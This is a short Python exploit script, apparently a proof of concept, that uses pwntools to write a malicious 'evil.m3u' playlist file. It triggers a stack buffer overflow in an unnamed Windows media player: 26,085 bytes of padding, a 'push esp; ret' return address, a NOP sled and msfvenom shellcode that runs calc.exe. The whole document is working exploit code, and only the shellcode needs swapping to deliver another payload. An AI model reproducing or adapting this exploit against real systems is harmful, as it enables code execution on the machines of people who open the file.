#!/usr/bin/env python3

from pwn import *


pad = b'A' * 26085

# 0x1001b058: push esp; ret;
ret = p32(0x1001b058)

nop = b'\x90' * 64

# msfvenom -p windows/exec -b '\x00\x09\x0a' -f py CMD=calc.exe
buf =  b""
buf += b"\xbb\xc4\x6d\xe6\xc8\xda\xc8\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xcb\x8f"
buf += b"\x13\x34\x3b\xcd\xdc\xc5\xbb\xb2\x55\x20\x8a\xf2\x02"
buf += b"\x20\xbc\xc2\x41\x64\x30\xa8\x04\x9d\xc3\xdc\x80\x92"
buf += b"\x64\x6a\xf7\x9d\x75\xc7\xcb\xbc\xf5\x1a\x18\x1f\xc4"
buf += b"\xd4\x6d\x5e\x01\x08\x9f\x32\xda\x46\x32\xa3\x6f\x12"
buf += b"\x8f\x48\x23\xb2\x97\xad\xf3\xb5\xb6\x63\x88\xef\x18"
buf += b"\x85\x5d\x84\x10\x9d\x82\xa1\xeb\x16\x70\x5d\xea\xfe"
buf += b"\x49\x9e\x41\x3f\x66\x6d\x9b\x07\x40\x8e\xee\x71\xb3"
buf += b"\x33\xe9\x45\xce\xef\x7c\x5e\x68\x7b\x26\xba\x89\xa8"
buf += b"\xb1\x49\x85\x05\xb5\x16\x89\x98\x1a\x2d\xb5\x11\x9d"
buf += b"\xe2\x3c\x61\xba\x26\x65\x31\xa3\x7f\xc3\x94\xdc\x60"
buf += b"\xac\x49\x79\xea\x40\x9d\xf0\xb1\x0e\x60\x86\xcf\x7c"
buf += b"\x62\x98\xcf\xd0\x0b\xa9\x44\xbf\x4c\x36\x8f\x84\xa3"
buf += b"\x7c\x92\xac\x2b\xd9\x46\xed\x31\xda\xbc\x31\x4c\x59"
buf += b"\x35\xc9\xab\x41\x3c\xcc\xf0\xc5\xac\xbc\x69\xa0\xd2"
buf += b"\x13\x89\xe1\xb0\xf2\x19\x69\x19\x91\x99\x08\x65"

with open('evil.m3u', 'wb') as fp:
    fp.write(pad + ret + nop + buf)
